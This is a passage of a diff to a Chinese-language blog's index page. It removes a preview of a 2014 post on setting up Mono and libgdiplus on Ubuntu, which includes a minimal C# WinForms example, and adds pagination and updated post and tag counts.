           <div class="post-more-link text-center">
             <a class="btn" href="/howto/ubuntu-installed-mono-environment-1/#more" rel="contents">
-              阅读全文 &raquo;
-            </a>
-          </div>
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
-      
-
-  
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/howto/ubuntu-installed-mono-environment-2/" itemprop="url">
-                  ubuntu安装mono环境(二)
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            <span class="post-meta-item-icon">
-              <i class="fa fa-calendar-o"></i>
-            </span>
-            <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2014-03-28T00:00:00+08:00" content="2014-03-28">
-              2014-03-28
-            </time>
-          </span>
-
-          
-            <span class="post-category" >
-              &nbsp; | &nbsp;
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              <span class="post-meta-item-text">分类于</span>
-              
-                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                  <a href="/categories/howto/" itemprop="url" rel="index">
-                    <span itemprop="name">howto</span>
-                  </a>
-                </span>
-
-                
-                
-
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                &nbsp; | &nbsp;
-                <a href="/howto/ubuntu-installed-mono-environment-2/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="howto/ubuntu-installed-mono-environment-2/" itemprop="commentsCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-
-          
-          
-
-          
-        </div>
-      </header>
-    
-
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <p>接上篇，上篇仅安装了Mono本身，并没有安装libgdiplus、gtk-sharp、mod_mono、MonoDevelop 等其他相关的软件。<br>这篇主要是配置安装libgdiplus。</p>
-<h2 id="0×00准备工作"><a href="#0×00准备工作" class="headerlink" title="0×00准备工作"></a>0×00准备工作</h2><p>先在VS2012上编译一个winform，代码如下：<br><figure class="highlight cs"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System;</span><br><span class="line"><span class="keyword">using</span> System.Windows.Forms;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">FormsTest</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="keyword">static</span> <span class="keyword">class</span> <span class="title">Program</span></span><br><span class="line">&#123;</span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;summary&gt;</span></span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> 应用程序的主入口点。</span></span><br><span class="line"><span class="comment"><span class="doctag">///</span> <span class="doctag">&lt;/summary&gt;</span></span></span><br><span class="line">[STAThread]</span><br><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">void</span> <span class="title">Main</span>(<span class="params"></span>)</span><br><span class="line"></span>&#123;</span><br><span class="line">Application.EnableVisualStyles();</span><br><span class="line">Application.SetCompatibleTextRenderingDefault(<span class="literal">false</span>);</span><br><span class="line">Application.Run(<span class="keyword">new</span> Form());</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
-          <div class="post-more-link text-center">
-            <a class="btn" href="/howto/ubuntu-installed-mono-environment-2/#more" rel="contents">
               阅读全文 &raquo;
             </a>
           </div>
@@ -1508,6 +1516,10 @@
   </section>
 
   
+  <nav class="pagination">
+    <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="extend next" rel="next" href="/page/2/"><i class="fa fa-angle-right"></i></a>
+  </nav>
+
 
 
           </div>
@@ -1546,7 +1558,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">10</span>
+              <span class="site-state-item-count">11</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -1563,7 +1575,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">20</span>
+                <span class="site-state-item-count">22</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
